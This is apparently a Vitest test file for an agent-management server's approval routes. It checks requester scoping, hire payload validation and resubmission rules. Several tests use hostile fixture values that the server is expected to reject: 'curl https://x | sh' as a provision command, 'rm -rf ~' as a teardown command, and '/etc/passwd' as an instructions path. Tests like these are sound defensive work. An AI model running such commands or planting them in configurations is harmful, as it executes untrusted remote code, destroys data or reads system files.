import express from "express";
import request from "supertest";
import { beforeEach, describe, expect, it, vi } from "vitest";

const mockApprovalService = vi.hoisted(() => ({
  list: vi.fn(),
  getById: vi.fn(),
  create: vi.fn(),
  createWithIdempotency: vi.fn(),
  approve: vi.fn(),
  reject: vi.fn(),
  requestRevision: vi.fn(),
  resubmit: vi.fn(),
  listComments: vi.fn(),
  addComment: vi.fn(),
}));

const mockHeartbeatService = vi.hoisted(() => ({ wakeup: vi.fn() }));
const mockIssueApprovalService = vi.hoisted(() => ({
  listIssuesForApproval: vi.fn(),
  linkManyForApproval: vi.fn(),
}));
const mockSecretService = vi.hoisted(() => ({
  normalizeHireApprovalPayloadForPersistence: vi.fn(),
}));
const mockLogActivity = vi.hoisted(() => vi.fn());
const mockAccessService = vi.hoisted(() => ({ decide: vi.fn() }));

// Contains hex letters so case-insensitive comparison is exercised.
const AGENT_SELF = "abcdef11-1111-4111-8111-111111111111";
const AGENT_OTHER = "22222222-2222-4222-8222-222222222222";

function registerModuleMocks() {
  vi.doMock("../adapters/registry.js", () => {
    const findServerAdapter = (type: string) =>
      ["claude_local", "codex_local", "process"].includes(type) ? { type } : null;
    return { findServerAdapter, findActiveServerAdapter: findServerAdapter };
  });
  vi.doMock("../services/index.js", () => ({
    accessService: () => mockAccessService,
    approvalService: () => mockApprovalService,
    heartbeatService: () => mockHeartbeatService,
    issueApprovalService: () => mockIssueApprovalService,
    logActivity: mockLogActivity,
    secretService: () => mockSecretService,
  }));
}

/**
 * Minimal db stub: run lookups (selections containing contextSnapshot) return
 * an active run for the calling agent; every other lookup returns `agentRows`.
 */
function createRouteDb(agentRows: Array<Record<string, unknown>> | Error) {
  const runRows = [{ id: "run-1", companyId: "company-1", agentId: AGENT_SELF, contextSnapshot: {} }];
  return {
    select: vi.fn((selection: Record<string, unknown> = {}) => ({
      from: vi.fn(() => ({
        where: vi.fn(() => ({
          then: async (resolve: (rows: unknown[]) => unknown, reject: (error: unknown) => unknown) => {
            if (Object.keys(selection).includes("contextSnapshot")) return resolve(runRows);
            return agentRows instanceof Error ? reject(agentRows) : resolve(agentRows);
          },
        })),
      })),
    })),
  } as any;
}

async function createApp(actor: Record<string, unknown>, agentRows: Array<Record<string, unknown>> | Error = []) {
  const [{ errorHandler }, { approvalRoutes }] = await Promise.all([
    import("../middleware/index.js"),
    import("../routes/approvals.js"),
  ]);
  const app = express();
  app.use(express.json());
  app.use((req, _res, next) => {
    (req as any).actor = actor;
    next();
  });
  app.use("/api", approvalRoutes(createRouteDb(agentRows)));
  app.use(errorHandler);
  return app;
}

const boardActor = {
  type: "board",
  userId: "user-1",
  companyIds: ["company-1"],
  source: "session",
  isInstanceAdmin: false,
};

const agentActor = {
  type: "agent",
  agentId: AGENT_SELF,
  companyId: "company-1",
  runId: "run-1",
  source: "api_key",
  isInstanceAdmin: false,
};

function approvalRecord(overrides: Record<string, unknown> = {}) {
  return {
    id: "approval-1",
    companyId: "company-1",
    type: "approve_ceo_strategy",
    status: "pending",
    payload: {},
    requestedByAgentId: null,
    requestedByUserId: "user-1",
    decisionNote: null,
    decidedByUserId: null,
    decidedAt: null,
    createdAt: new Date("2026-10-31T00:00:00.000Z"),
    updatedAt: new Date("2026-10-31T00:00:00.000Z"),
    ...overrides,
  };
}

describe("approval routes requester and hire-target scoping", () => {
  beforeEach(() => {
    vi.resetModules();
    vi.doUnmock("../services/index.js");
    vi.doUnmock("../adapters/registry.js");
    vi.doUnmock("../routes/approvals.js");
    vi.doUnmock("../middleware/index.js");
    registerModuleMocks();
    vi.clearAllMocks();
    mockAccessService.decide.mockResolvedValue({
      allowed: true,
      action: "company_scope:read",
      reason: "allow_test",
      explanation: "Allowed by test mock.",
    });
    mockApprovalService.create.mockImplementation(async (_companyId: string, data: Record<string, unknown>) =>
      approvalRecord(data),
    );
    mockSecretService.normalizeHireApprovalPayloadForPersistence.mockImplementation(
      async (_companyId: string, payload: Record<string, unknown>) => payload,
    );
    mockLogActivity.mockResolvedValue(undefined);
  });

  it("rejects an agent creating an approval on behalf of another agent", async () => {
    const res = await request(await createApp(agentActor))
      .post("/api/companies/company-1/approvals")
      .send({ type: "approve_ceo_strategy", requestedByAgentId: AGENT_OTHER, payload: {} });

    expect(res.status).toBe(403);
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("accepts an agent naming itself with a differently-cased uuid and stores its own id", async () => {
    const res = await request(await createApp(agentActor))
      .post("/api/companies/company-1/approvals")
      .send({ type: "approve_ceo_strategy", requestedByAgentId: AGENT_SELF.toUpperCase(), payload: {} });

    expect(res.status).toBe(201);
    expect(mockApprovalService.create).toHaveBeenCalledWith(
      "company-1",
      expect.objectContaining({ requestedByAgentId: AGENT_SELF }),
    );
  });

  it("attributes an agent-created approval to the calling agent", async () => {
    const res = await request(await createApp(agentActor))
      .post("/api/companies/company-1/approvals")
      .send({ type: "approve_ceo_strategy", payload: {} });

    expect(res.status).toBe(201);
    expect(mockApprovalService.create).toHaveBeenCalledWith(
      "company-1",
      expect.objectContaining({ requestedByAgentId: AGENT_SELF }),
    );
  });

  it("rejects a board user naming a requester agent from another company", async () => {
    const res = await request(await createApp(boardActor, [{ companyId: "company-2" }]))
      .post("/api/companies/company-1/approvals")
      .send({ type: "approve_ceo_strategy", requestedByAgentId: AGENT_OTHER, payload: {} });

    expect(res.status).toBe(422);
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("accepts a board user naming a requester agent in the same company", async () => {
    const res = await request(await createApp(boardActor, [{ companyId: "company-1" }]))
      .post("/api/companies/company-1/approvals")
      .send({ type: "approve_ceo_strategy", requestedByAgentId: AGENT_OTHER, payload: {} });

    expect(res.status).toBe(201);
    expect(mockApprovalService.create).toHaveBeenCalledWith(
      "company-1",
      expect.objectContaining({ requestedByAgentId: AGENT_OTHER }),
    );
  });

  it("rejects a hire_agent approval whose payload targets an agent in another company", async () => {
    const res = await request(
      await createApp(boardActor, [{ companyId: "company-2", status: "pending_approval" }]),
    )
      .post("/api/companies/company-1/approvals")
      .send({ type: "hire_agent", payload: { agentId: AGENT_OTHER } });

    expect(res.status).toBe(422);
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("rejects a hire_agent approval whose payload targets an already-active agent", async () => {
    const res = await request(await createApp(boardActor, [{ companyId: "company-1", status: "idle" }]))
      .post("/api/companies/company-1/approvals")
      .send({ type: "hire_agent", payload: { agentId: AGENT_OTHER } });

    expect(res.status).toBe(422);
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("rejects a hire_agent approval naming a pending agent in the same company and points to agent-hires", async () => {
    // The pending agent already has the approval agent-hires created with it;
    // a second one would let the board approve a payload it never reviewed.
    const res = await request(
      await createApp(agentActor, [{ companyId: "company-1", status: "pending_approval" }]),
    )
      .post("/api/companies/company-1/approvals")
      .send({
        type: "hire_agent",
        payload: { agentId: AGENT_OTHER, adapterConfig: { command: "echo attacker" } },
      });

    expect(res.status).toBe(422);
    expect(res.body.error).toContain("POST /api/companies/:companyId/agent-hires");
    expect(mockApprovalService.create).not.toHaveBeenCalled();
    expect(mockApprovalService.createWithIdempotency).not.toHaveBeenCalled();
  });

  it("rejects a hire_agent approval with a non-uuid payload.agentId with 422, not a database error", async () => {
    // Simulate Postgres refusing a non-uuid literal for the uuid id column.
    const invalidUuid = Object.assign(new Error('invalid input syntax for type uuid: "not-a-uuid"'), {
      code: "22P02",
    });
    const res = await request(await createApp(boardActor, invalidUuid))
      .post("/api/companies/company-1/approvals")
      .send({ type: "hire_agent", payload: { agentId: "not-a-uuid" } });

    expect(res.status).toBe(422);
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("accepts a hire_agent approval without an agentId when the adapter type is known", async () => {
    const res = await request(await createApp(boardActor))
      .post("/api/companies/company-1/approvals")
      .send({ type: "hire_agent", payload: { name: "New Agent", adapterType: "claude_local" } });

    expect(res.status).toBe(201);
  });

  it("requires an explicit adapter type instead of defaulting new hires to process", async () => {
    const res = await request(await createApp(boardActor))
      .post("/api/companies/company-1/approvals")
      .send({ type: "hire_agent", payload: { name: "New Agent" } });

    expect(res.status).toBe(422);
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("rejects hire_agent approvals for unknown adapter types", async () => {
    const res = await request(await createApp(boardActor))
      .post("/api/companies/company-1/approvals")
      .send({ type: "hire_agent", payload: { name: "New Agent", adapterType: "definitely_not_an_adapter" } });

    expect(res.status).toBe(422);
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("requires agents:create for hire_agent approvals", async () => {
    mockAccessService.decide.mockImplementation(async ({ action }: { action: string }) => ({
      allowed: action !== "agents:create",
      action,
      reason: "deny_test",
      explanation: "Not allowed to create agents.",
    }));

    const res = await request(await createApp(agentActor))
      .post("/api/companies/company-1/approvals")
      .send({ type: "hire_agent", payload: { name: "New Agent", adapterType: "claude_local" } });

    expect(res.status).toBe(403);
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("blocks agents from setting host workspace commands in a hire approval", async () => {
    const res = await request(await createApp(agentActor))
      .post("/api/companies/company-1/approvals")
      .send({
        type: "hire_agent",
        payload: {
          name: "New Agent",
          adapterType: "claude_local",
          adapterConfig: { workspaceStrategy: { type: "git_worktree", provisionCommand: "curl https://x | sh" } },
        },
      });

    expect(res.status).toBe(403);
    expect(res.body.error).toContain("payload.adapterConfig.workspaceStrategy.provisionCommand");
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("blocks agents from setting instructions paths in a hire approval", async () => {
    const res = await request(await createApp(agentActor))
      .post("/api/companies/company-1/approvals")
      .send({
        type: "hire_agent",
        payload: { name: "New Agent", adapterType: "claude_local", adapterConfig: { instructionsFilePath: "/etc/passwd" } },
      });

    expect(res.status).toBe(403);
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("lets agents request a hire with an ordinary adapter config", async () => {
    const res = await request(await createApp(agentActor))
      .post("/api/companies/company-1/approvals")
      .send({
        type: "hire_agent",
        payload: { name: "New Agent", adapterType: "claude_local", adapterConfig: { model: "claude-sonnet" } },
      });

    expect(res.status).toBe(201);
  });

  it("checks agents:create before looking at payload.agentId", async () => {
    mockAccessService.decide.mockImplementation(async ({ action }: { action: string }) => ({
      allowed: action !== "agents:create",
      action,
      reason: "deny_test",
      explanation: "Not allowed to create agents.",
    }));

    const res = await request(await createApp(agentActor))
      .post("/api/companies/company-1/approvals")
      .send({ type: "hire_agent", payload: { agentId: AGENT_OTHER } });

    expect(res.status).toBe(403);
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("stores the trimmed adapter type, not the raw one", async () => {
    const res = await request(await createApp(boardActor))
      .post("/api/companies/company-1/approvals")
      .send({ type: "hire_agent", payload: { name: "New Agent", adapterType: " claude_local " } });

    expect(res.status).toBe(201);
    expect(mockApprovalService.create).toHaveBeenCalledWith(
      "company-1",
      expect.objectContaining({ payload: expect.objectContaining({ adapterType: "claude_local" }) }),
    );
  });

  it("blocks agents from setting host workspace commands in a runtimeConfig model profile", async () => {
    const res = await request(await createApp(agentActor))
      .post("/api/companies/company-1/approvals")
      .send({
        type: "hire_agent",
        payload: {
          name: "New Agent",
          adapterType: "claude_local",
          runtimeConfig: {
            modelProfiles: {
              cheap: { adapterConfig: { workspaceStrategy: { type: "git_worktree", provisionCommand: "curl https://x | sh" } } },
            },
          },
        },
      });

    expect(res.status).toBe(403);
    expect(res.body.error).toContain(
      "payload.runtimeConfig.modelProfiles.cheap.adapterConfig.workspaceStrategy.provisionCommand",
    );
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("blocks agents from setting instructions paths in a runtimeConfig model profile", async () => {
    const res = await request(await createApp(agentActor))
      .post("/api/companies/company-1/approvals")
      .send({
        type: "hire_agent",
        payload: {
          name: "New Agent",
          adapterType: "claude_local",
          runtimeConfig: { modelProfiles: { cheap: { adapterConfig: { instructionsFilePath: "/etc/passwd" } } } },
        },
      });

    expect(res.status).toBe(403);
    expect(res.body.error).toContain("payload.runtimeConfig.modelProfiles.cheap.adapterConfig.instructionsFilePath");
    expect(mockApprovalService.create).not.toHaveBeenCalled();
  });

  it("rejects legacy prompt templates for adapters with managed instructions", async () => {
    for (const key of ["promptTemplate", "bootstrapPromptTemplate"]) {
      mockApprovalService.create.mockClear();
      const res = await request(await createApp(boardActor))
        .post("/api/companies/company-1/approvals")
        .send({
          type: "hire_agent",
          payload: { name: "New Agent", adapterType: "claude_local", adapterConfig: { [key]: "You are..." } },
        });

      expect(res.status).toBe(422);
      expect(res.body.error).toContain("instructionsBundle/AGENTS.md");
      expect(mockApprovalService.create).not.toHaveBeenCalled();
    }
  });

  it("still accepts a prompt template for adapters without managed instructions", async () => {
    const res = await request(await createApp(boardActor))
      .post("/api/companies/company-1/approvals")
      .send({
        type: "hire_agent",
        payload: { name: "New Agent", adapterType: "process", adapterConfig: { promptTemplate: "You are..." } },
      });

    expect(res.status).toBe(201);
  });

  it("allows a hire resubmission that keeps the agent-hires payload.agentId", async () => {
    mockApprovalService.getById.mockResolvedValue(
      approvalRecord({
        type: "hire_agent",
        status: "revision_requested",
        payload: { agentId: AGENT_OTHER, name: "Coder", adapterType: "claude_local" },
      }),
    );
    mockApprovalService.resubmit.mockImplementation(async (_id: string, payload: Record<string, unknown>) =>
      approvalRecord({ type: "hire_agent", status: "pending", payload }),
    );

    const res = await request(await createApp(boardActor))
      .post("/api/approvals/approval-1/resubmit")
      .send({ payload: { agentId: AGENT_OTHER, name: "Coder v2", adapterType: "claude_local" } });

    expect(res.status).toBe(200);
    expect(mockApprovalService.resubmit).toHaveBeenCalledWith(
      "approval-1",
      expect.objectContaining({ agentId: AGENT_OTHER, name: "Coder v2" }),
    );
  });

  it("refuses a hire resubmission that changes payload.agentId", async () => {
    mockApprovalService.getById.mockResolvedValue(
      approvalRecord({
        type: "hire_agent",
        status: "revision_requested",
        payload: { agentId: AGENT_SELF },
      }),
    );

    const res = await request(await createApp(boardActor))
      .post("/api/approvals/approval-1/resubmit")
      .send({ payload: { agentId: AGENT_OTHER } });

    expect(res.status).toBe(422);
    expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
  });

  describe("hire resubmissions", () => {
    function revisionRequestedHire(payload: Record<string, unknown> = {}) {
      return approvalRecord({
        type: "hire_agent",
        status: "revision_requested",
        requestedByAgentId: AGENT_SELF,
        requestedByUserId: null,
        payload: { agentId: AGENT_OTHER, name: "Coder", adapterType: "claude_local", ...payload },
      });
    }

    beforeEach(() => {
      mockApprovalService.getById.mockResolvedValue(revisionRequestedHire());
      mockApprovalService.resubmit.mockImplementation(async (_id: string, payload: Record<string, unknown>) =>
        approvalRecord({ type: "hire_agent", status: "pending", payload }),
      );
    });

    async function resubmitAsRequester(payload: Record<string, unknown>) {
      return request(await createApp(agentActor))
        .post("/api/approvals/approval-1/resubmit")
        .send({ payload: { agentId: AGENT_OTHER, name: "Coder", ...payload } });
    }

    it("lets the requesting agent resubmit an ordinary revised hire", async () => {
      const res = await resubmitAsRequester({ adapterType: "claude_local", adapterConfig: { timeoutSec: 600 } });

      expect(res.status).toBe(200);
      expect(mockApprovalService.resubmit).toHaveBeenCalledTimes(1);
    });

    it("requires agents:create", async () => {
      mockAccessService.decide.mockImplementation(async ({ action }: { action: string }) => ({
        allowed: action !== "agents:create",
        action,
        reason: "deny_test",
        explanation: "Not allowed to create agents.",
      }));

      const res = await resubmitAsRequester({ adapterType: "claude_local" });

      expect(res.status).toBe(403);
      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
    });

    it("rejects an unknown or missing adapter type", async () => {
      for (const adapterType of ["definitely_not_an_adapter", undefined]) {
        const res = await resubmitAsRequester({ adapterType });

        expect(res.status).toBe(422);
      }
      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
    });

    it("stores the trimmed adapter type", async () => {
      const res = await resubmitAsRequester({ adapterType: " claude_local " });

      expect(res.status).toBe(200);
      expect(mockApprovalService.resubmit).toHaveBeenCalledWith(
        "approval-1",
        expect.objectContaining({ adapterType: "claude_local" }),
      );
    });

    it("blocks agents from setting instructions paths", async () => {
      const res = await resubmitAsRequester({
        adapterType: "claude_local",
        adapterConfig: { instructionsFilePath: "/etc/passwd" },
      });

      expect(res.status).toBe(403);
      expect(res.body.error).toContain("payload.adapterConfig.instructionsFilePath");
      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
    });

    it("blocks agents from setting host workspace commands", async () => {
      const res = await resubmitAsRequester({
        adapterType: "claude_local",
        adapterConfig: { workspaceStrategy: { type: "git_worktree", provisionCommand: "curl https://x | sh" } },
      });

      expect(res.status).toBe(403);
      expect(res.body.error).toContain("payload.adapterConfig.workspaceStrategy.provisionCommand");
      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
    });

    it("blocks agents from setting workspace commands in a runtimeConfig model profile", async () => {
      const res = await resubmitAsRequester({
        adapterType: "claude_local",
        runtimeConfig: {
          modelProfiles: { cheap: { adapterConfig: { workspaceStrategy: { teardownCommand: "rm -rf ~" } } } },
        },
      });

      expect(res.status).toBe(403);
      expect(res.body.error).toContain(
        "payload.runtimeConfig.modelProfiles.cheap.adapterConfig.workspaceStrategy.teardownCommand",
      );
      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
    });

    it("lets agents keep values the revised approval already carried, but not change them", async () => {
      // agent-hires stores the server-materialized instructions bundle in the
      // approval payload; resubmitting that payload as received must work.
      const carried = {
        adapterType: "claude_local",
        adapterConfig: {
          instructionsBundleMode: "managed",
          instructionsFilePath: "/paperclip/agents/coder/instructions/AGENTS.md",
          workspaceStrategy: { type: "git_worktree", provisionCommand: "pnpm install" },
        },
        runtimeConfig: { modelProfiles: { cheap: { adapterConfig: { workspaceStrategy: { teardownCommand: "true" } } } } },
      };
      mockApprovalService.getById.mockResolvedValue(revisionRequestedHire(carried));

      const unchanged = await resubmitAsRequester({ ...carried, name: "Coder v2" });
      expect(unchanged.status).toBe(200);
      expect(mockApprovalService.resubmit).toHaveBeenCalledTimes(1);

      const changedPath = await resubmitAsRequester({
        ...carried,
        adapterConfig: { ...carried.adapterConfig, instructionsFilePath: "/etc/passwd" },
      });
      expect(changedPath.status).toBe(403);
      expect(changedPath.body.error).toContain("payload.adapterConfig.instructionsFilePath");

      const changedProfileCommand = await resubmitAsRequester({
        ...carried,
        runtimeConfig: { modelProfiles: { cheap: { adapterConfig: { workspaceStrategy: { teardownCommand: "rm -rf ~" } } } } },
      });
      expect(changedProfileCommand.status).toBe(403);
      expect(changedProfileCommand.body.error).toContain(
        "payload.runtimeConfig.modelProfiles.cheap.adapterConfig.workspaceStrategy.teardownCommand",
      );
      expect(mockApprovalService.resubmit).toHaveBeenCalledTimes(1);
    });

    it("rejects legacy prompt templates for adapters with managed instructions", async () => {
      const res = await resubmitAsRequester({
        adapterType: "claude_local",
        adapterConfig: { promptTemplate: "You are..." },
      });

      expect(res.status).toBe(422);
      expect(mockApprovalService.resubmit).not.toHaveBeenCalled();
    });
  });
});
